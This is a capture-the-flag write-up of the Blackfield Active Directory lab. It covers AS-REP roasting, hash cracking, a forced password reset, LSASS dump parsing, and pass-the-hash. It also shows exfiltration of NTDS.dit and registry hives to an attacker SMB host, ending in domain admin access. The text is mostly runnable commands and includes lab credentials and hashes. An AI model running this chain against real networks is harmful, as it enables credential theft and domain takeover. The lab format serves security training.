# Blackfield - Writeup

## Initial Enumeration

### Port Scanning
A comprehensive port scan revealed standard Active Directory services:
```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
```

### Domain Information
From the scan results, I identified domain information:
```
Domain: BLACKFIELD.local
Domain Controller: DC01.BLACKFIELD.local
```

### SMB Enumeration
I checked for SMB access with null and guest authentication:
```bash
crackmapexec smb 10.129.229.17 -u '' -p ''
crackmapexec smb 10.129.229.17 -u 'Guest' -p ''
```

Guest authentication revealed access to a "profiles$" share:
```bash
smbclient //10.129.229.17/profiles$ -U Guest
```

This share contained numerous directories named after potential usernames. I extracted these usernames for further attacks:
```bash
smbclient //10.129.229.17/profiles$ -U Guest -c "ls" | awk '{print $1}' > users.txt
```

## Gaining Initial Access

### AS-REP Roasting
With the user list in hand, I attempted AS-REP Roasting to identify users with Kerberos pre-authentication disabled:
```bash
GetNPUsers.py BLACKFIELD.LOCAL/ -usersfile users.txt -dc-ip 10.129.229.17 -no-pass
```

This revealed a hash for the "support" user:
```
$krb5asrep$23$support@BLACKFIELD.LOCAL:b3db2df37b67a1b8ae5639d98bacaf27$e1203eeede294e058990c0ab70ef72087b38608fbfd36cbbab4416999f92e4b84b44ec41bf4cafdaadeeb394f4183625541ebebf4ece454878392e9f98e19014528f687e6c98edc578c6c99bb35b37cd582d17b423368cf1c6e223495ab2a39158a2d34927280532c5dec7b00c01b058a2cea204e1a96c81e18cb78feef82ad51cc58a596c95b10c8ad889665a3f61b4381fc63387d52c957e2f2d7bf1178a64a3f5e4cd2a7c1513e1c26d8fe809f6693af17fad6749cd896967ff288bcf9d7202f28fb00716357fa483ec2ace48204fcdc9b002cdb32806e85fb33405e8c501dfc79734d5745cb973f798b4674c1de93e5ab9ad
```

### Password Cracking
I used Hashcat to crack the hash:
```bash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

This revealed valid credentials:
- **Username**: support
- **Password**: #00^BlackKnight

### BloodHound Enumeration
I used BloodHound to map the domain and identify attack paths:
```bash
bloodhound-python -c All -u support -p '#00^BlackKnight' -d BLACKFIELD.LOCAL -dc DC01.BLACKFIELD.LOCAL -ns 10.129.229.17
```

Analysis of the BloodHound data revealed that the "support" user had the ability to change passwords for the "audit2020" user.

## Lateral Movement

### Password Reset
I used the support account's privileges to reset the password for audit2020:
```bash
net rpc password "audit2020" "Dolphin1" -U "blackfield.local"/"support"%"#00^BlackKnight" -S "dc01.blackfield.local"
```

### Share Enumeration
With the new credentials, I enumerated accessible shares:
```bash
crackmapexec smb 10.129.229.17 -u 'audit2020' -p 'Dolphin1' --shares
```

This revealed several shares, including an interesting "forensic" share:
```
SMB         10.129.229.17   445    DC01             forensic        READ            Forensic / Audit share.
```

### Memory Dump Analysis
I connected to the forensic share and found a memory dump file:
```bash
smbclient //10.129.229.17/forensic -U 'audit2020%Dolphin1'
get lsass.DMP
```

I analyzed the memory dump using pypykatz:
```bash
pypykatz lsa minidump lsass.DMP
```

This revealed credentials for the "svc_backup" user:
- **Username**: svc_backup
- **NT Hash**: 9658d1d1dcd9250115e2205d9f48400d

## Privilege Escalation

### Windows Backup Privileges
I connected to the target using the svc_backup account with pass-the-hash:
```bash
evil-winrm -H 9658d1d1dcd9250115e2205d9f48400d -u 'svc_backup' -i 10.129.229.17
```

Through BloodHound analysis, I discovered that svc_backup was a member of the "Backup Operators" group, which has significant privileges including the ability to read any file on the system regardless of ACLs.

### Setting Up SMB Server
I set up an SMB server on my attack machine to receive the backup files:
```bash
impacket-smbserver smb . -smb2support -username smb -password pass
```

### Domain Controller Backup
On the target, I mounted my SMB share and performed a backup of the NTDS.dit file:
```powershell
net use k: \\10.10.16.42\smb /user:smb pass
echo "Y" | wbadmin start backup -backuptarget:\\10.10.16.42\smb -include:c:\windows\ntds
```

I then identified the backup version and initiated recovery:
```powershell
wbadmin get versions
echo "Y" | wbadmin start recovery -version:11/19/2024-01:15 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:c:\ -notrestoreacl
```

### Registry Hive Extraction
I also extracted the SYSTEM registry hive:
```powershell
reg save HKLM\SYSTEM C:\system.hive
```

And copied both files back to my attack machine:
```powershell
copy C:\ntds.dit \\10.10.16.42\smb\ntds.dit
copy C:\system.hive \\10.10.16.42\smb\system.hive
```

### Extracting Domain Hashes
Using Impacket's secretsdump, I extracted all domain hashes:
```bash
impacket-secretsdump -ntds ntds.dit -system system.hive local
```

This revealed the Administrator hash:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
```

### Domain Admin Access
With the Administrator hash, I performed a pass-the-hash attack to gain domain admin access:
```bash
evil-winrm -H 184fb5e5178480be64824d4cd53b99ee -u 'Administrator' -i 10.129.229.17
```

This provided full administrative access to the domain controller, successfully completing the challenge.